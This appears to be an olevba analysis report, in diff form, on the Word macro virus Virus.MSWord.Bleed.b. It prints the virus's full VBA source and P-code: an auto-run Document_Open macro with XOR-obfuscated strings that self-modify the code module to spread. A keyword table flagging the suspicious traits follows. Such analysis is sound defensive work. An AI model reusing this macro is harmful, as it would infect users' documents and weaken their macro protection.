@@ -1,0 +1,213 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSWord.Bleed.b
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: ./Virus.MSWord.Bleed.b - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Document_Open()
+Dim jacky(15) As String
+jacky(1) = "Øù·Òååøå·Åòäâúò·Ùòïã­·Äòã·ò·ª·ÚöôåøÔøùãöþùòå­·ã·ª·¦"
+jacky(2) = "ÄòãÖããå·ÙøåúöûÃòúçûöãò¹ÑâûûÙöúò»·áõÙøåúöû"
+jacky(3) = "Äòã·à·ª·ò¹ÁÕÇåøýòôã­·Øçãþøùä¹ÁþåâäÇåøãòôãþøù·ª·¿Åùó·½·§¾­·Øçãþøùä¹ÄöáòÙøåúöûÇåøúçã·ª·¿Åùó·½·§¾"
+jacky(4) = "Äòã·û·ª·à¹ÁÕÔøúçøùòùãä¿ã¾­·Äòã·ð·ª·û¹ÔøóòÚøóâûò"
+jacky(5) = "Äòã·ä·ª·ÙøåúöûÃòúçûöãò­·Äòã·ãÿ·ª·ä¹ÁÕÇåøýòôã¹ÁÕÔøúçøùòùãä¿ã¾¹ÔøóòÚøóâûò"
+jacky(6) = "õ·ª·ð¹ûþùòä¿ã»·¥¡¾·±·áõÔå·±·ð¹ûþùòä¿£¤»·¦¾"
+jacky(7) = "Þñ·ò·ª·ä·Ãÿòù"
+jacky(8) = "Äòã·ä·ª·ÖôãþáòÓøôâúòùã­·Äòã·ãÿ·ª·ä¹ÁÕÇåøýòôã¹ÁÕÔøúçøùòùãä¿ã¾¹ÔøóòÚøóâûò"
+jacky(9) = "Òùó·Þñ"
+jacky(10) = "Þñ·ãÿ¹ûþùòä¿ã»·ã¾·ª·§·Ãÿòù"
+jacky(11) = "ãÿ¹ÓÒûÒãòÛÞùòÄ·ã»·ãÿ¹ôØâùãøñÛÞùÒä­·ãÿ¹ÖóóÑåøúÄãåþùð·õ"
+jacky(12) = "Òùó·Þñ"
+jacky(13) = "ÃÿþäÓøôâúòùã¹ÁÕÇåøýòôã¹ÁÕÔøúçøùòùãä¿ã¾¹ÔøóòÚøóâûò¹ÓÒûÒãòÛÞùòÄ·¥ »·¦¡"
+jacky(14) = "Þñ·Óöî¿Ùøà¿¾¾·ª·¿Þùã¿Åùó·½·¦¢¾¾·Ãÿòù·ÚäðÕøï·µÔþöø·Äûöðòÿöúúòå¶·Ôøúò·äãöþ¨µ»·§»·µÔûöää¹Äûöðòÿöúúòå·ë·ýöôü·ãàøñûøàòå·¸·ÛþùòÍòå§·¸·Úòãöçÿöäòµ"
+jacky(15) = "ÖôãþáòÓøôâúòùã¹ÄöáòÖä·ÖôãþáòÓøôâúòùã¹ÑâûûÙöúò"
+For y = 1 To 15: V = V & dc(jacky(y), 151) & vbCr: Next
+If ThisDocument.VBProject.VBComponents(1).CodeModule.lines(28, 1) = "" Then ThisDocument.VBProject.VBComponents(1).CodeModule.InsertLines 27, V
+differ
+End Sub
+Private Function dc(a, e)
+For i = 1 To Len(a): t = t & Chr(Asc(Mid(a, i, 1)) Xor e): Next i
+dc = t
+End Function
+Private Sub differ()
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSWord.Bleed.b
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 30323 bytes
+' Line #0:
+' 	FuncDefn (Private Sub Document_Open())
+' Line #1:
+' 	Dim 
+' 	OptionBase 
+' 	LitDI2 0x000F 
+' 	VarDefn jacky (As String)
+' Line #2:
+' 	LitStr 0x0033 "Øù·Òååøå·Åòäâúò·Ùòïã­·Äòã·ò·ª·ÚöôåøÔøùãöþùòå­·ã·ª·¦"
+' 	LitDI2 0x0001 
+' 	ArgsSt jacky 0x0001 
+' Line #3:
+' 	LitStr 0x0029 "ÄòãÖããå·ÙøåúöûÃòúçûöãò¹ÑâûûÙöúò»·áõÙøåúöû"
+' 	LitDI2 0x0002 
+' 	ArgsSt jacky 0x0001 
+' Line #4:
+' 	LitStr 0x005E "Äòã·à·ª·ò¹ÁÕÇåøýòôã­·Øçãþøùä¹ÁþåâäÇåøãòôãþøù·ª·¿Åùó·½·§¾­·Øçãþøùä¹ÄöáòÙøåúöûÇåøúçã·ª·¿Åùó·½·§¾"
+' 	LitDI2 0x0003 
+' 	ArgsSt jacky 0x0001 
+' Line #5:
+' 	LitStr 0x002F "Äòã·û·ª·à¹ÁÕÔøúçøùòùãä¿ã¾­·Äòã·ð·ª·û¹ÔøóòÚøóâûò"
+' 	LitDI2 0x0004 
+' 	ArgsSt jacky 0x0001 
+' Line #6:
+' 	LitStr 0x0047 "Äòã·ä·ª·ÙøåúöûÃòúçûöãò­·Äòã·ãÿ·ª·ä¹ÁÕÇåøýòôã¹ÁÕÔøúçøùòùãä¿ã¾¹ÔøóòÚøóâûò"
+' 	LitDI2 0x0005 
+' 	ArgsSt jacky 0x0001 
+' Line #7:
+' 	LitStr 0x002A "õ·ª·ð¹ûþùòä¿ã»·¥¡¾·±·áõÔå·±·ð¹ûþùòä¿£¤»·¦¾"
+' 	LitDI2 0x0006 
+' 	ArgsSt jacky 0x0001 
+' Line #8:
+' 	LitStr 0x000D "Þñ·ò·ª·ä·Ãÿòù"
+' 	LitDI2 0x0007 
+' 	ArgsSt jacky 0x0001 
+' Line #9:
+' 	LitStr 0x0047 "Äòã·ä·ª·ÖôãþáòÓøôâúòùã­·Äòã·ãÿ·ª·ä¹ÁÕÇåøýòôã¹ÁÕÔøúçøùòùãä¿ã¾¹ÔøóòÚøóâûò"
+' 	LitDI2 0x0008 
+' 	ArgsSt jacky 0x0001 
+' Line #10:
+' 	LitStr 0x0006 "Òùó·Þñ"
+' 	LitDI2 0x0009 
+' 	ArgsSt jacky 0x0001 
+' Line #11:
+' 	LitStr 0x001A "Þñ·ãÿ¹ûþùòä¿ã»·ã¾·ª·§·Ãÿòù"
+' 	LitDI2 0x000A 
+' 	ArgsSt jacky 0x0001 
+' Line #12:
+' 	LitStr 0x0035 "ãÿ¹ÓÒûÒãòÛÞùòÄ·ã»·ãÿ¹ôØâùãøñÛÞùÒä­·ãÿ¹ÖóóÑåøúÄãåþùð·õ"
+' 	LitDI2 0x000B 
+' 	ArgsSt jacky 0x0001 
+' Line #13:
+' 	LitStr 0x0006 "Òùó·Þñ"
+' 	LitDI2 0x000C 
+' 	ArgsSt jacky 0x0001 
+' Line #14:
+' 	LitStr 0x0044 "ÃÿþäÓøôâúòùã¹ÁÕÇåøýòôã¹ÁÕÔøúçøùòùãä¿ã¾¹ÔøóòÚøóâûò¹ÓÒûÒãòÛÞùòÄ·¥ »·¦¡"
+' 	LitDI2 0x000D 
+' 	ArgsSt jacky 0x0001 
+' Line #15:
+' 	LitStr 0x008A "Þñ·Óöî¿Ùøà¿¾¾·ª·¿Þùã¿Åùó·½·¦¢¾¾·Ãÿòù·ÚäðÕøï·µÔþöø·Äûöðòÿöúúòå¶·Ôøúò·äãöþ¨µ»·§»·µÔûöää¹Äûöðòÿöúúòå·ë·ýöôü·ãàøñûøàòå·¸·ÛþùòÍòå§·¸·Úòãöçÿöäòµ"
+' 	LitDI2 0x000E 
+' 	ArgsSt jacky 0x0001 
+' Line #16:
+' 	LitStr 0x002D "ÖôãþáòÓøôâúòùã¹ÄöáòÖä·ÖôãþáòÓøôâúòùã¹ÑâûûÙöúò"
+' 	LitDI2 0x000F 
+' 	ArgsSt jacky 0x0001 
+' Line #17:
+' 	StartForVariable 
+' 	Ld y 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x000F 
+' 	For 
+' 	BoS 0x0000 
+' 	Ld V 
+' 	Ld y 
+' 	ArgsLd jacky 0x0001 
+' 	LitDI2 0x0097 
+' 	ArgsLd dc 0x0002 
+' 	Concat 
+' 	Ld vbCr 
+' 	Concat 
+' 	St V 
+' 	BoS 0x0000 
+' 	StartForVariable 
+' 	Next 
+' Line #18:
+' 	LitDI2 0x001C 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld ThisDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd lines 0x0002 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x001B 
+' 	Ld V 
+' 	LitDI2 0x0001 
+' 	Ld ThisDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall InsertLines 0x0002 
+' 	EndIf 
+' Line #19:
+' 	ArgsCall differ 0x0000 
+' Line #20:
+' 	EndSub 
+' Line #21:
+' 	FuncDefn (Private Function dc(a, e, id_FFFE As Variant))
+' Line #22:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld a 
+' 	FnLen 
+' 	For 
+' 	BoS 0x0000 
+' 	Ld t 
+' 	Ld a 
+' 	Ld i 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	ArgsLd Asc 0x0001 
+' 	Ld e 
+' 	Xor 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St t 
+' 	BoS 0x0000 
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #23:
+' 	Ld t 
+' 	St dc 
+' Line #24:
+' 	EndFunc 
+' Line #25:
+' 	FuncDefn (Private Sub differ())
+' Line #26:
+' 	EndSub 
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
+|          |                    |opened                                       |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
